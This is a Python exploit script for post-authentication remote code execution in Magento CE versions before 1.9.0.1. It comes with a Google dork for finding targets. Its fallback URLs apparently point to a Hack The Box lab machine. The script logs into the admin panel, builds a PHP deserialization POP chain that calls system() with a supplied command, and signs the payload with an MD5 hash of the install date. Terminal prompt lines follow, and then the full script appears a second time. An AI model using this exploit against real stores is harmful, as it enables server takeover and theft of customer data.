# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE 
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Contributor: Hackhoven
# Github repository: https://github.com/Hackhoven/Magento-RCE

from hashlib import md5
import sys
import re
import base64
import mechanize

def usage():
    sys.exit()

if len(sys.argv) != 3:
    usage()

target = sys.argv[1]
arg = sys.argv[2]

# CREDS YOU'VE AUTHENTICATED WITH
username = 'asd'    # CHANGE THIS
password = 'asdasd'    # CHANGE THIS
php_function = 'system'  # Note: we can only pass 1 argument to the function 
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml, you can grab with 'curl -s http://localhost:5000/app/etc/local.xml | grep date'

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)
br = mechanize.Browser()
br.set_handle_robots(False)

request = br.open(target)

# Print out the forms and controls for debugging
for form in br.forms():
    print("Form name:", form.name)
    for control in form.controls:
        print("Control name:", control.name)

# Select the form specifically by its action or name if known
form_found = False
for form in br.forms():
    if 'login[username]' in form:
        br.form = form
        form_found = True
        break

if not form_found:
    print("Login form not found!")
    sys.exit()

# Select the specific control by index if necessary
control_username = None
control_password = None

for control in br.form.controls:
    if control.name == 'login[username]':
        control_username = control
    if control.name == 'login[password]':
        control_password = control

if control_username is None or control_password is None:
    print("Required form controls not found!")
    sys.exit()

control_username.value = username
control_password.value = password

br.method = "POST"
request = br.submit()
content = request.read().decode()  

# http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/7a78908f36add54eb2116a6d0d7dbca4/
url = re.search(r"ajaxBlockUrl = ", content)
if url:
    url = url.group(1)
else:
    print("Failed to find ajaxBlockUrl")
    url = "http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/7a78908f36add54eb2116a6d0d7dbca4/"
    #sys.exit()

key = re.search(r"var FORM_KEY = '(.*)'", content)
if key:
    key = key.group(1)
else:
    print("Failed to find FORM_KEY")
    key = "VDfSSZbjogVG7Ecz"
    #sys.exit()

request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search(r'src=\"(.*)\?ga=', request.read().decode())
if tunnel:
    tunnel = tunnel.group(1)
else:
    print("Failed to find tunnel URL")
    tunnel = "http://swagshop.htb/index.php/admin/dashboard/tunnel/key/5b80c78af8f37002563517abb9476a81/?ga=YTo5OntzOjM6ImNodCI7czoyOiJsYyI7czozOiJjaGYiO3M6Mzk6ImJnLHMsZjRmNGY0fGMsbGcsOTAsZmZmZmZmLDAuMSxlZGVkZWQsMCI7czozOiJjaG0iO3M6MTQ6IkIsZjRkNGIyLDAsMCwwIjtzOjQ6ImNoY28iO3M6NjoiZGI0ODE0IjtzOjM6ImNoZCI7czo1MDoiZTpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBZi5BQUFBQUFBQUFBQUFBQUFBQUEiO3M6NDoiY2h4dCI7czozOiJ4LHkiO3M6NDoiY2h4bCI7czo3NToiMDp8fHwyMDowMHx8fDIzOjAwfHx8MDI6MDB8fHwwNTowMHx8fDA4OjAwfHx8MTE6MDB8fHwxNDowMHx8fDE3OjAwfDE6fDB8MXwyIjtzOjM6ImNocyI7czo3OiI1ODd4MzAwIjtzOjM6ImNoZyI7czoyMjoiNC4zNDc4MjYwODY5NTY1LDUwLDEsMCI7fQ%253D%253D&h=6d6a1fd7ee6d1cfc020bd7b99ca417dc" 
    #sys.exit()

payload = base64.b64encode(payload.encode()).decode()
gh = md5((payload + install_date).encode()).hexdigest()

exploit = tunnel + '?ga=' + payload + '&h=' + gh

try:
    request = br.open(exploit)
    print(request.read().decode())
except (mechanize.HTTPError, mechanize.URLError) as e:
    print(e.read().decode())
┌─[eu-dedivip-2]─[10.10.14.136]─[htb-mp-1037529@htb-3ntraggfbx]─[~]
└──╼ [★]$ cat rce.py  | xsel -b
┌─[eu-dedivip-2]─[10.10.14.136]─[htb-mp-1037529@htb-3ntraggfbx]─[~]
└──╼ [★]$ cat rce.py  | xsel -b
┌─[eu-dedivip-2]─[10.10.14.136]─[htb-mp-1037529@htb-3ntraggfbx]─[~]
└──╼ [★]$ cat rce.py  | xsel -b
┌─[eu-dedivip-2]─[10.10.14.136]─[htb-mp-1037529@htb-3ntraggfbx]─[~]
└──╼ [★]$ cat rce.py
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE 
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Contributor: Hackhoven
# Github repository: https://github.com/Hackhoven/Magento-RCE

from hashlib import md5
import sys
import re
import base64
import mechanize

def usage():
    sys.exit()

if len(sys.argv) != 3:
    usage()

target = sys.argv[1]
arg = sys.argv[2]

# CREDS YOU'VE AUTHENTICATED WITH
username = 'asd'    # CHANGE THIS
password = 'asdasd'    # CHANGE THIS
php_function = 'system'  # Note: we can only pass 1 argument to the function 
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml, you can grab with 'curl -s http://localhost:5000/app/etc/local.xml | grep date'

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)
br = mechanize.Browser()
br.set_handle_robots(False)

request = br.open(target)

# Print out the forms and controls for debugging
for form in br.forms():
    print("Form name:", form.name)
    for control in form.controls:
        print("Control name:", control.name)

# Select the form specifically by its action or name if known
form_found = False
for form in br.forms():
    if 'login[username]' in form:
        br.form = form
        form_found = True
        break

if not form_found:
    print("Login form not found!")
    sys.exit()

# Select the specific control by index if necessary
control_username = None
control_password = None

for control in br.form.controls:
    if control.name == 'login[username]':
        control_username = control
    if control.name == 'login[password]':
        control_password = control

if control_username is None or control_password is None:
    print("Required form controls not found!")
    sys.exit()

control_username.value = username
control_password.value = password

br.method = "POST"
request = br.submit()
content = request.read().decode()  

# http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/7a78908f36add54eb2116a6d0d7dbca4/
url = re.search(r"ajaxBlockUrl = ", content)
if url:
    url = url.group(1)
else:
    print("Failed to find ajaxBlockUrl")
    url = "http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/7a78908f36add54eb2116a6d0d7dbca4/"
    #sys.exit()

key = re.search(r"var FORM_KEY = '(.*)'", content)
if key:
    key = key.group(1)
else:
    print("Failed to find FORM_KEY")
    key = "VDfSSZbjogVG7Ecz"
    #sys.exit()

request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search(r'src=\"(.*)\?ga=', request.read().decode())
if tunnel:
    tunnel = tunnel.group(1)
else:
    print("Failed to find tunnel URL")
    tunnel = "http://swagshop.htb/index.php/admin/dashboard/tunnel/key/5b80c78af8f37002563517abb9476a81/?ga=YTo5OntzOjM6ImNodCI7czoyOiJsYyI7czozOiJjaGYiO3M6Mzk6ImJnLHMsZjRmNGY0fGMsbGcsOTAsZmZmZmZmLDAuMSxlZGVkZWQsMCI7czozOiJjaG0iO3M6MTQ6IkIsZjRkNGIyLDAsMCwwIjtzOjQ6ImNoY28iO3M6NjoiZGI0ODE0IjtzOjM6ImNoZCI7czo1MDoiZTpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBZi5BQUFBQUFBQUFBQUFBQUFBQUEiO3M6NDoiY2h4dCI7czozOiJ4LHkiO3M6NDoiY2h4bCI7czo3NToiMDp8fHwyMDowMHx8fDIzOjAwfHx8MDI6MDB8fHwwNTowMHx8fDA4OjAwfHx8MTE6MDB8fHwxNDowMHx8fDE3OjAwfDE6fDB8MXwyIjtzOjM6ImNocyI7czo3OiI1ODd4MzAwIjtzOjM6ImNoZyI7czoyMjoiNC4zNDc4MjYwODY5NTY1LDUwLDEsMCI7fQ%253D%253D&h=6d6a1fd7ee6d1cfc020bd7b99ca417dc" 
    #sys.exit()

payload = base64.b64encode(payload.encode()).decode()
gh = md5((payload + install_date).encode()).hexdigest()

exploit = tunnel + '?ga=' + payload + '&h=' + gh

try:
    request = br.open(exploit)
    print(request.read().decode())
except (mechanize.HTTPError, mechanize.URLError) as e:
    print(e.read().decode())
